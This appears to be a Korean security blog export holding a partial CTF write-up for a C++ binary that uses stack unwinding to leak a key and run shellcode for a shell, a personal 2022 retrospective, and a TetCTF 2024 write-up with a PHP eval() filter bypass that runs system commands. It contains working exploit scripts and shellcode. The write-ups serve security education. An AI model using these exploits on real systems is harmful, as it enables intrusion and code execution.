./test.py[+] Starting local process &#x27;./trust_code&#x27;: pid 2560632[*] Switching to interactive mode [*] Process &#x27;./trust_code&#x27; stopped with exit code 0 (pid 2560632)= Executed =\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Sorry for the inconvenience, there was a problem while decrypting code.[*] Got EOF while reading in interactive\n출력 루틴의 정체는 run 함수에 존재하는 랜딩 패드입니다. run 함수에서 Shellcode 객체를 선언하는데, 예외가 발생하면 스택 되감기 과정에서 이 객체를 소멸시켜야 하므로 소멸자를 호출하는 랜딩 패드를 먼저 방문하는 것입니다. run 함수의 그래프를 살펴보면 그림에서 색칠한 부분과 같이 다른 루틴과 동떨어진 블록이 하나 있습니다. 이 블록이 바로 랜딩 패드입니다.\n\n이번에는 버퍼 오버플로우를 일으키기 위해 code에 16개의 a와 8개의 b, 8개의 c를 입력하였습니다. 실행하면 세그멘테이션 오류가 발생하며 종료하는데, &quot;stack smashing detected&quot;와 같은 오류 메시지가 출력되지 않습니다. 이는 Canary 보호 기법에 의한 것이 아니라 다른 루틴에서 오류가 발생하여 종료하였음을 나타냅니다.\n# ...def main():    r.sendafter(b&quot;iv&gt;&quot;, b&quot;a&quot; * 16 + b&quot;b&quot; * 8 + b&quot;c&quot; * 8)    r.sendafter(b&quot;code&gt;&quot;, b&quot;a&quot; * 48)    r.interactive()\n$ ./test.py[+] Starting local process &#x27;./trust_code&#x27;: pid 2562716[*] Switching to interactive mode [*] Got EOF while reading in interactive$[*] Process &#x27;./trust_code&#x27; stopped with exit code -11 (SIGSEGV) (pid 2562716)[*] Got EOF while sending in interactive\nGDB를 붙여 실행하면 오류가 발생한 원인은 _Unwind_RaiseException 함수에서 호출한 루틴이 주소 0x6363636363636363 에 접근을 시도하였기 때문임을 확인할 수 있습니다. 이 주소는 버퍼 오버플로우를 일으키기 위해 입력한 8개의 c에 해당합니다. 또한 _Unwind_RaiseException 함수를 디스어셈블하면 호출한 루틴은 uw_frame_state_for 내장 함수임을 알 수 있습니다. (자세한 설명은 말머리에서 링크한 글의 ‘동적 분석’ 문단을 참고하기 바랍니다)\nProgram received signal SIGSEGV, Segmentation fault.0x00007ff413636c50 in ?? () from /lib/x86_64-linux-gnu/libgcc_s.so.1Python Exception &lt;class &#x27;AttributeError&#x27;&gt;: &#x27;NoneType&#x27; object has no attribute &#x27;startswith&#x27;...pwndbg&gt; pdisass 1 ► 0x7ff413636c50    cmp    byte ptr [rax], 0x48   0x7ff413636c53    jne    0x7ff413636bb0                &lt;0x7ff413636bb0&gt;   0x7ff413636c59    movabs rdx, 0x50f0000000fc0c7pwndbg&gt; i r raxrax            0x6363636363636363  7161677110969590627pwndbg&gt; k#0  0x00007ff413636c50 in ?? () from /lib/x86_64-linux-gnu/libgcc_s.so.1#1  0x00007ff41363808b in _Unwind_RaiseException () from /lib/x86_64-linux-gnu/libgcc_s.so.1#2  0x00007ff41383b69c in __cxa_throw () from /lib/x86_64-linux-gnu/libstdc++.so.6#3  0x000055ffe2bb5333 in decrypt(unsigned char*) ()#4  0x000055ffe2bb53d6 in read_code() ()#5  0x000055ffe2bb5627 in run() ()#6  0x000055ffe2bb56d0 in loop() ()#7  0x000055ffe2bb5748 in service() ()#8  0x6363636363636363 in ?? ()#9  0x0000000000000000 in ?? ()pwndbg&gt; disass _Unwind_RaiseExceptionDump of assembler code for function _Unwind_RaiseException:...   0x00007ff413638080 &lt;+304&gt;:   mov    rsi,r13   0x00007ff413638083 &lt;+307&gt;:   mov    rdi,r12   0x00007ff413638086 &lt;+310&gt;:   call   0x7ff413636800   0x00007ff41363808b &lt;+315&gt;:   cmp    eax,0x5   0x00007ff41363808e &lt;+318&gt;:   je     0x7ff413638103 &lt;_Unwind_RaiseException+435&gt;\nuw_frame_state_for 내장 함수는 인자로 전달된 context 구조체가 나타내는 프레임의 CIE와 FDE를 찾아 해석하는 함수입니다. 이 함수 내부에서 페이로드로 입력한 주소에 접근하는 것은 버퍼 오버플로우로 인해 먼저 스택이 오염되고, 오염된 내용을 스택 되감기 과정에서 참조하면서 context 구조체가 오염되었기 때문임을 추론할 수 있습니다. 이를 확인하기 위해 uw_frame_state_for 함수를 호출하는 _Unwind_RaiseException+310 주소에 중단점을 설정하고 GDB를 붙여 실행해 보겠습니다.\npwndbg&gt; set $context=$rdipwndbg&gt; continue...pwndbg&gt; x/20gx $rdi0x7ffd76e021f0: 0x00007ffd76e02468      0x00007ffd76e024700x7ffd76e02200: 0x0000000000000000      0x00007ffd76e024780x7ffd76e02210: 0x0000000000000000      0x00000000000000000x7ffd76e02220: 0x00007ffd76e024b0      0x00000000000000000x7ffd76e02230: 0x0000000000000000      0x00000000000000000x7ffd76e02240: 0x0000000000000000      0x00000000000000000x7ffd76e02250: 0x00007ffd76e024b8      0x00007ffd76e024c00x7ffd76e02260: 0x00007ffd76e02490      0x00007ffd76e024980x7ffd76e02270: 0x00007ffd76e026b8      0x00000000000000000x7ffd76e02280: 0x00007ffd76e026c0      0x000055d6cf1f7748pwndbg&gt; continue...pwndbg&gt; x/20gx $context0x7fff5b23be70: 0x00007fff5b23c0e8      0x00007fff5b23c0f00x7fff5b23be80: 0x0000000000000000      0x00007fff5b23c0f80x7fff5b23be90: 0x0000000000000000      0x00000000000000000x7fff5b23bea0: 0x00007fff5b23c130      0x00000000000000000x7fff5b23beb0: 0x0000000000000000      0x00000000000000000x7fff5b23bec0: 0x0000000000000000      0x00000000000000000x7fff5b23bed0: 0x00007fff5b23c138      0x00007fff5b23c1400x7fff5b23bee0: 0x00007fff5b23c110      0x00007fff5b23c1180x7fff5b23bef0: 0x00007fff5b23c368      0x00000000000000000x7fff5b23bf00: 0x00007fff5b23c370      0x6363636363636363\n계속 실행하다 보면 context-&gt;ra 필드의 값이 0x000055d6cf1f7748 에서 0x6363636363636363 으로 바뀌는 것을 확인할 수 있습니다. 전자는 버퍼 오버플로우가 발생하는 service 루틴의 내부이고, 후자는 버퍼 오버플로우로 인해 변조된 리턴 주소입니다.\ncontext-&gt;ra 필드는 스택 되감기 과정에서 personality 루틴이 랜딩 패드의 주소를 구하기 위해 참조하는 값입니다. 따라서 이 필드의 값을 적절히 변조하면 원하는 랜딩 패드를 방문할 수 있습니다. 앞서 run 함수는 출력 루틴인 Shellcode 의 소멸자를 호출하는 랜딩 패드를 가지고 있었습니다. context-&gt;ra 필드의 값을 run 함수 내부에서 read_code 함수를 호출하는 run+23 으로 변조하면, personality 루틴은 이를 기준으로 랜딩 패드의 주소를 구합니다. 그 결과 실행 흐름이 옮겨지면 run 함수의 랜딩 패드를 다시 방문하게 됩니다.\npwndbg&gt; disass runDump of assembler code for function run():   0x000055d6cf1f7610 &lt;+0&gt;:     sub    rsp,0x48   0x000055d6cf1f7614 &lt;+4&gt;:     mov    rax,QWORD PTR fs:0x28   0x000055d6cf1f761d &lt;+13&gt;:    mov    QWORD PTR [rsp+0x40],rax   0x000055d6cf1f7622 &lt;+18&gt;:    call   0x55d6cf1f7370 &lt;read_code()&gt;   0x000055d6cf1f7627 &lt;+23&gt;:    mov    QWORD PTR [rsp],rax   ...\n그런데 변조되는 값은 context-&gt;ra 만이므로, 프레임 자체는 service 함수를 호출하는 launch 함수로 되감아진 상태에서 실행 흐름만 run 함수의 랜딩 패드로 옮겨지게 됩니다. 그리고 launch 함수는 서버에 존재하는 AES 키 값인 secret_key.txt 파일을 읽어 스택 버퍼에 저장하는 함수입니다. 따라서 랜딩 패드에서 Shellcode 구조체의 소멸자는 스택에 선언된 sc.code 라고 생각되는 값을 출력하겠지만, 실제로는 launch 함수의 프레임에 존재하는 AES 키 값이 출력될 것입니다.\n바이너리에서 run+23 코드의 오프셋은 0x1627 입니다. ASLR에 의해 하위 12비트를 제외한 주소는 런타임에 랜덤하게 정해지므로, 실제 주소의 하위 2바이트가 0x5627 이라고 가정하면 1/161/161/16의 확률로 일치하게 됩니다. 따라서 다음과 같이 key 값을 유출하기 위한 코드를 작성할 수 있습니다.\n#!/usr/bin/python3from pwn import *r = remote(&quot;localhost&quot;, 1234)# r = process(&quot;./trust_code&quot;)context.log_level = &quot;debug&quot;def main():    r.sendafter(b&quot;iv&gt;&quot;, b&quot;a&quot; * 24 + b&quot;\\x27\\x56&quot;)    r.sendafter(b&quot;code&gt;&quot;, b&quot;a&quot; * 8)    r.interactive()if __name__ == &quot;__main__&quot;:    main()\n셸 스크립트로 무한 루프를 만들어 성공할 때까지 반복 실행하면 다음과 같이 key 값인 &quot;USER_SECRET_KEY!&quot; 가 출력됨을 확인할 수 있습니다.\n$ while [ true ]; do ./leak.py; done[+] Opening connection to localhost on port 1234: Done...[+] Opening connection to localhost on port 1234: Done[DEBUG] Received 0x4 bytes:    b&#x27;iv&gt; &#x27;[DEBUG] Sent 0x1a bytes:    b&quot;aaaaaaaaaaaaaaaaaaaaaaaa&#x27;V&quot;[DEBUG] Received 0x6 bytes:    b&#x27;code&gt; &#x27;[DEBUG] Sent 0x8 bytes:    b&#x27;a&#x27; * 0x8[*] Switching to interactive mode [DEBUG] Received 0xa5 bytes:    00000000  0a 3d 20 45  78 65 63 75  74 65 64 20  3d 0a 00 00  │·= E│xecu│ted │=···│    00000010  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│    00000020  00 00 00 00  00 00 00 00  00 00 00 00  00 00 0a 3d  │····│····│····│···=│    00000030  20 45 78 65  63 75 74 65  64 20 3d 0a  00 1c 01 00  │ Exe│cute│d =·│····│    00000040  00 00 00 00  79 00 00 00  00 00 00 00  55 53 45 52  │····│y···│····│USER│    00000050  5f 53 45 43  52 45 54 5f  4b 45 59 21  0a 53 6f 72  │_SEC│RET_│KEY!│·Sor│    00000060  72 79 20 66  6f 72 20 74  68 65 20 69  6e 63 6f 6e  │ry f│or t│he i│ncon│    00000070  76 65 6e 69  65 6e 63 65  2c 20 74 68  65 72 65 20  │veni│ence│, th│ere │    00000080  77 61 73 20  61 20 70 72  6f 62 6c 65  6d 20 77 68  │was │a pr│oble│m wh│    00000090  69 6c 65 20  64 65 63 72  79 70 74 69  6e 67 20 63  │ile │decr│ypti│ng c│    000000a0  6f 64 65 2e  0a                                     │ode.│·│    000000a5= Executed =\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00= Executed =\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00SER_SECRET_KEY!Sorry for the inconvenience, there was a problem while decrypting code.[*] Got EOF while reading in interactive\nkey 값을 유출하였으므로 셸코드를 암호화하여 전송하면 되는데, \\x0f 와 \\x05 를 사용하면 실패하는 조건이 있습니다. 따라서 syscall 와 sysenter 인스트럭션을 통해 시스템 콜을 호출할 수 없습니다. 그런데 코드가 복사 후 실행되는 영역은 쓰기와 실행이 모두 가능한 rwx 페이지입니다. 그러므로 런타임에 동적으로 셸코드의 내용을 수정하는 코드를 추가하면 syscall 인스트럭션을 실행할 수 있습니다.\n사용자가 입력한 코드를 호출하는 부분은 execute+57 입니다. 이 주소에 중단점을 걸고 실행하면 해당 위치에서 rax 레지스터에는 rwx 페이지의 주소, rsi 레지스터에는 0x1000 이 저장되어 있습니다.\nBreakpoint 1, 0x000055f56b7fb589 in execute(unsigned char*) ()...pwndbg&gt; pdisass 1 ► 0x55f56b7fb589    call   qword ptr [rsp + 8]           &lt;0x7fb6a29c7000&gt;   0x55f56b7fb58d    mov    rdi, qword ptr [rsp + 8]   0x55f56b7fb592    mov    esi, 0x1000pwndbg&gt; i r rax rsirax            0x7fb6a29c7000      140422388936704rsi            0x1000              4096pwndbg&gt; vmmap $raxLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA    0x7fb6a29c7000     0x7fb6a29c8000 rwxp     1000 0      [anon_7fb6a29c7] +0x0\n이들 레지스터의 값을 이용하여 셸코드의 마지막 2바이트에 \\x0f\\x05 를 대입하는 코드를 추가한 익스플로잇 코드를 다음과 같이 작성합니다. 익스플로잇 코드를 실행하면 셸을 획득할 수 있습니다.\n#!/usr/bin/python3from pwn import *from Crypto.Cipher import AESr = remote(&quot;localhost&quot;, 1234)# context.log_level = &quot;debug&quot;def main():    sc = b&quot;\\x66\\x81\\xee\\xf1\\x0a\\x66\\x89\\x70\\x1e&quot;    # sub si,0xaf1 ; mov [rax+30],si    sc += b&quot;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\xff\\xff&quot;   # \\xff\\xff becomes \\x0f\\x05    key = b&quot;USER_SECRET_KEY!&quot;    iv = b&quot;a&quot; * 16    cipher = AES.new(key, AES.MODE_CBC, iv=iv)    ct = cipher.encrypt(b&quot;TRUST_CODE_ONLY!&quot; + sc)    r.sendafter(b&quot;iv&gt;&quot;, iv)    r.sendafter(b&quot;code&gt;&quot;, ct)    r.interactive()if __name__ == &quot;__main__&quot;:    main()\n$ ./ex.py[+] Opening connection to localhost on port 1234: Done[*] Switching to interactive mode $ iduid=1000(ctf) gid=1000(ctf) groups=1000(ctf)$\n\n\n","categories":["Security","CTF"]},{"title":"2022년을 돌아보며","url":"/2022/12/31/looking-back-on-2022/","content":"개요\n다섯 가지 주제를 통해 2022년 한 해를 돌아보았습니다.\n💪 건강\n체력과 근력이 확실히 좋아졌습니다. 2~3km 정도는 적당히 빠른 속도로 기분 좋게 뛸 수 있고, 아직 자주는 아니지만 달리기를 좋아하게 되었습니다. 그리고 상체 전반의 근육 쓰는 법을 익혔고 스스로 목표한 수준의 몸을 만들었습니다. 무엇보다 꾸준히 즐겁게 운동하는 습관이 생긴 것이 가장 뿌듯합니다.\n정신건강 부분에서는 스트레스를 덜 받는 법을 배우고 있는 것 같습니다. 특히 나의 관점에서 다른 사람의 행동이나 세상 돌아가는 일을 평가하는 것이 항상 옳지는 않을뿐더러, 불필요한 힘을 낭비하고 스트레스만 일으킨다는 사실을 깨달았습니다. 내년부터는 타인과 외부 환경에 대한 아쉬운 얘기를 줄이는 대신, 나 자신은 매일 조금씩 더 나아지고 있는지 먼저 생각하는 사람이 되려고 합니다.\n👨‍💻 진로\n현역 입대 자체는 다소 충동적이었지만, 병역 의무를 대부분 해결했습니다. 그러면서도 학기 중에는 늘 해야지 하고 시간을 들이지 못했던 소소한 목표들을 군 복무 중 이루게 되어 행복합니다. 전공 분야에서는 알고리즘을 여러 책으로 공부하면서 정렬, 탐색, 다양한 자료구조와 그래프 개념과 아주 친해졌습니다. 덤으로 solved.ac 플래티넘 티어도 달성했는데, 골드 1티어에서 마지막 문제를 푼 날은 랭크 게임의 승급전을 치르는 것처럼 쫄깃했던 기억이 납니다.\n보안 분야에서는 동아리원 한 분과 선의의 경쟁을 하다 보니 드림핵 랭킹을 7위까지 올렸습니다. 고난도 문제를 연달아 풀다 보니 커널, 브라우저, 최신 웹 취약점을 열심히 공부했고, 새로운 지식과 인사이트를 많이 얻었습니다. 그리고 참 어이없게도 재학 중일 때보다 해킹대회에 더 많이 참가했습니다. 군인 신분으로 CCE 본선에 진출한 경험은 정말 신선했고, 아직도 그날의 분위기가 생생합니다. 약점을 보완해서 반드시 다시 도전하고 싶다는 자극이 되었습니다.\n💳 경제\n스스로 사실상 금융 문맹에 가까웠음을 느꼈던 한 해였습니다. 성인으로서 가져야 할 경제와 금융 지식도 부족했고, 소비 습관도 합리적이지는 못했다고 생각합니다. 그래서 늦게나마 경제 지식에 관한 공부를 시작했습니다. 한국은행 경제교육실에서 발간한 알기 쉬운 경제이야기 책으로 이제 발걸음을 뗀 단계지만, 재미를 느끼고 있습니다. 이 책이 무료인데도 계속 개정이 되고 있고, 정말 읽기 쉬우면서도 유익해서 놀랐습니다.\n당장 느낀 점은 경제 지식이 조금만 생겨도 자본주의 체제인 세상을 보는 관점이 바뀌고, 시야가 넓어진다는 것입니다. 그리고 앞으로의 삶에서 중장기 경제 계획은 필수적이고, 생애 주기별로 필요한 자금을 마련하기 위해서는 반드시 적절한 자산 운용이 필요함을 알게 되었습니다. 곧 전역하면 자취를 시작할 예정입니다. 어떤 것이 합리적인 의사 결정이고 소비인지 배웠으니, 실제로 연습해서 지출 통제를 실천할 좋은 기회라고 생각합니다.\n📚 독서\n군 복무를 하면서 의외로 책 읽는 취미와 습관이 생겼습니다. 통념과는 달리 부대 도서관에는 생각보다 유익하고 다양하면서 최근에 나온 책들이 많았고, 덕분에 시간이 정말 잘 갔습니다. 도서관의 좋은 책들을 거의 다 읽을 때쯤 학교 전자도서관의 존재를 알았는데, 서점의 신간 베스트셀러 서가에 있는 책이 전자책으로 올라와 있는 걸 보고 입이 떡 벌어졌습니다.\n대학 입학 후 오랜만에 책을 읽으면서 확실히 스스로 깊이 생각하고 돌아보는 감각이 너무 무디어졌음을 느꼈습니다. 여러 분야를 읽다 보니 뉴스나 인터넷을 통해 알게 된 지식 중 실제로는 사실이 아닌 것들도 많았음을 알게 되었습니다. 예를 들어 스탠퍼드 교도소 실험이나 밀그램의 복종 실험을 다룬 칼럼을 보고 역시 인간의 본성은 악하다고 생각했던 신입생 때가 있었는데, 실제로는 계획된 조작 실험이라는 진술이 많음을 한 저널리스트의 책을 읽고서야 알았습니다.\n💕 마음가짐\n말년에 풀어지는 것을 저 또한 완전히 피해 갈 수 없었습니다. 희한한 것이 군 복무 초반에는 5일 휴가를 나와도 시간이 아까워 학교 동아리방에서 워게임 문제를 풀었는데, 지금은 10일을 나와도 ‘말년이니까~’ 하면서 뒹굴뒹굴하고 있습니다. 그래도 컴퓨터는 지금까지 충분히 했고 나가면 질리도록 할 수 있으니, 운동과 독서 습관만 끝까지 붙들고 나와야겠습니다.\n그리고 사람이 너무 그리워졌습니다. 군 복무 전 만났던 친구들, 선배/후배님들, 같이 공부하면서 알게 된 분들과 생긴 크고 작은 인연이 얼마나 소중했는지를 절절히 느끼고 있습니다. 지금까지 관계 유지에 있어 너무 수동적으로 생각했던 것은 아닌지 돌아본 한 해가 되었습니다. 이전처럼 반갑고 익숙하게 만날 수 있었던 사람들이 정말 고마웠고, 그동안 내색을 못 해서 미안했습니다.\n결론\n요즈음 내년의 나는 무엇을 하는 사람이 되어야 할지 고민하고 있는데, 처음으로 한 해를 돌아보는 시간을 가지니 어느 정도 테두리가 그려지면서 도움이 많이 되었습니다. 다가오는 내년은 나 자신과 올해 함께한 인연들, 그리고 고마운 분들이 각자 바라는 무언가에 조금씩, 꾸준히 가까워지는 시간이 되기를 기원합니다. 마지막으로 새해 복 많이 받으세요! 🧨\n\n\n","categories":["Thoughts"]},{"title":"[TetCTF 2024] Stress Release Service","url":"/2024/02/03/tet24-stress-release-service/","content":"개요\n\nFor a better New Year, we are introducing a service that can help you reduce stress.\n\nchall.zip\n문제 분석\n웹페이지에 들어가면 입력 창과 버튼이 하나 있습니다. 버튼을 클릭하면 입력한 내용과 개구리가 함께 출력됩니다.\n\n소스 코드가 제공된 문제로, 플래그는 secret.php 에 하드코딩되어 있습니다. 상단에 배포한 파일에는 실제 플래그를 적어놓기는 했지만, 대회 환경에서 배포된 파일에는 가짜 플래그가 적혀 있습니다.\n&lt;?php// Veryyyyyy Secretttttttttttt !!!!!!!!!!!!!!!!!$FL4ggggggggggg = &quot;TetCTF&#123;*** redacted ***&#125;&quot;;?&gt;\nindex.php 를 보면 입력한 내용이 $voice 에 대입됩니다. 이후 validateInput() 함수의 검증을 통과할 경우 eval() 함수의 문자열 인자 중 일부로 전달됩니다. PHP의 eval() 함수는 문자열을 코드로 간주하여 실행하는 함수이기 때문에, 임의 코드 실행이 가능한 상황입니다.\nif (isset($_GET[&quot;shout&quot;]) &amp;&amp; !empty($_GET[&quot;shout&quot;]) &amp;&amp; is_string($_GET[&quot;shout&quot;])) &#123;\t$voice = $_GET[&quot;shout&quot;];\t$res = &quot;&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;img src=\\&quot;https://i.imgur.com/SvbbT0W.png\\&quot; width=5% /&gt; WRONGGGGG WAYYYYYY TOOOO RELEASEEEEE STRESSSSSSSS!!!!!!&lt;/center&gt;&quot;;\tif(validateInput($voice) === true) &#123;\t\teval(&quot;\\$res=&#x27;&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;img src=\\&quot;https://i.imgur.com/TL6siVW.png\\&quot; width=5% /&gt; &quot;.$voice.&quot;.&lt;/center&gt;&#x27;;&quot;);\t&#125;\tif (strlen($res) &lt; 300) &#123;\t\techo $res;\t&#125; else &#123;\t\techo &quot;&lt;center&gt;Too loud!!! Please respect your neighbor.&lt;/center&gt;&quot;;\t&#125;&#125;\nvalidateInput() 함수는 입력이 특수문자로만 이루어져 있는지, 사용한 문자의 종류가 7종을 초과하는지 검사합니다. 즉 이 문제는 특수문자 7종 이하만을 사용한 PHP 코드 작성을 요구하고 있습니다.\nfunction validateInput($input) &#123;    // To make your shout effective, it shouldn&#x27;t contain alphabets or numbers.    $pattern = &#x27;/[a-z0-9]/i&#x27;;    if (preg_match($pattern, $input)) &#123;        return false;    &#125;    // and only a few characters. Let&#x27;s make your shout clean.\t$count = count(array_count_values(str_split($input)));\tif ($count &gt; 7) &#123;\t\treturn false;\t&#125;\treturn true;&#125;\n문제 풀이\n기존의 특수문자만을 이용한 PHP 코드 실행 문제를 보면 몇 가지 파훼법이 존재합니다. 예를 들어 아래 풀이는 $_ 변수에 아무 문자열이나 대입한 후, $_++; 로 원하는 문자가 나올 때까지 증감 연산을 하는 방법을 사용합니다.\nBypass with PHP non-alpha encoderIn this tutorial, I will cover PHP non-alpha encoder. I will show some basic concept first before we going deeper which may cause brain…Medium\n그런데 이 문제는 PHP 8.3 버전에서 동작하여 위와 같은 방식을 사용할 수 없습니다. 증감 연산자에 대한 PHP 문서를 보면 8.3 버전부터 문자열에 대한 증감 연산을 더 이상 지원하지 않습니다.\n\n다만 PHP의 논리적 xor 연산자는 문자열 간의 연산을 지원하고 있습니다. php -a 로 인터랙티브 셸을 실행하여 확인할 수도 있습니다.\nInteractive shellphp &gt; echo &#x27;(&#x27; ^ &#x27;\\\\&#x27;;t\n그렇다면 특수문자 7종 간 xor 연산을 계속하여 코드 실행에 필요한 문자를 모두 얻을 수도 있을 것입니다.\nindex.php 코드를 보면 입력은 $res = '... 와 ...'; 사이에 들어갑니다. 따라서 문자열과 코드를 분리하기 위한 ' 와 ; 이 필요합니다. 또한 xor과 문자열 덧셈을 위한 ^ 와 . , xor 연산식을 감싸기 위한 ( 와 ) 를 선택했습니다. 7종을 채우려면 하나가 남는데, 역슬래시 \\\\ 를 사용했습니다.\n각 알파벳을 가장 적은 횟수의 xor 연산으로 얻는 완전 탐색을 실시하면, 선택한 특수문자 중 최대 6종만으로 모든 문자의 조합이 가능함을 확인할 수 있습니다.\n&#123;&#x27;A&#x27;: [39, 59, 40, 41, 92], &#x27;B&#x27;: [39, 94, 59], &#x27;C&#x27;: [39, 94, 59, 40, 41],... &#x27;x&#x27;: [39, 94, 40, 41], &#x27;y&#x27;: [39, 94], &#x27;z&#x27;: [39, 40, 41, 92]&#125;\n추가적으로 PHP는 다음과 같이 함수명에 해당하는 문자열을 괄호로 감싸 함수 호출이 가능합니다.\nInteractive shellphp &gt; system(&quot;id&quot;);uid=501(user) gid=1000(user) groups=1000(user)php &gt;php &gt; (&quot;system&quot;)(&quot;id&quot;);uid=501(user) gid=1000(user) groups=1000(user)\n따라서 system() 함수를 호출해 임의 커맨드를 실행할 수 있습니다. 아래 코드는 완전 탐색 후 (&quot;system&quot;)(&quot;cat s*&quot;) 를 실행하기 위한 특수문자 문자열을 조합합니다.\n#!/usr/bin/env python3from itertools import combinationsfrom functools import reducefrom operator import xorimport stringtbl = dict()def gen_table():    global tbl    cs = list(map(ord, [b&quot;&#x27;&quot;, b&quot;^&quot;, b&quot;;&quot;, b&quot;(&quot;, b&quot;)&quot;, b&quot;.&quot;, b&quot;\\\\&quot;]))    for i in range(6, 1, -1):        for it in combinations(cs, i):            c = chr(reduce(xor, it))            if c in string.ascii_letters + &quot; *&quot;:                tbl[c] = list(it)    return tbldef rtos(r: list):    res = &quot;(&quot;    for c in list(map(chr, r)):        res += &quot;&#x27;&quot; + (&quot;\\\\&quot; if c in [&quot;&#x27;&quot;, &quot;\\\\&quot;] else &quot;&quot;) + c + &quot;&#x27;^&quot;    return res[:-1] + &quot;)&quot;def encode(s):    res = &quot;&quot;    for i in range(0, len(s)):        res += rtos(tbl[s[i]]) + &quot;.&quot;    return res[:-1]def main():    gen_table()    f = encode(&quot;system&quot;)    a = encode(&quot;cat s*&quot;)    print(f&quot;&#x27;;(&#123;f&#125;)(&#123;a&#125;);&#x27;&quot;)if __name__ == &quot;__main__&quot;:    main()\n문자열을 입력하고 버튼을 누르면 개구리 말고 다른 내용은 보이지 않는데, 브라우저의 소스 코드 확인 기능을 이용하면 플래그가 포함되어 있는 것을 확인할 수 있습니다.\n\n\n\n","categories":["Security","CTF"]}]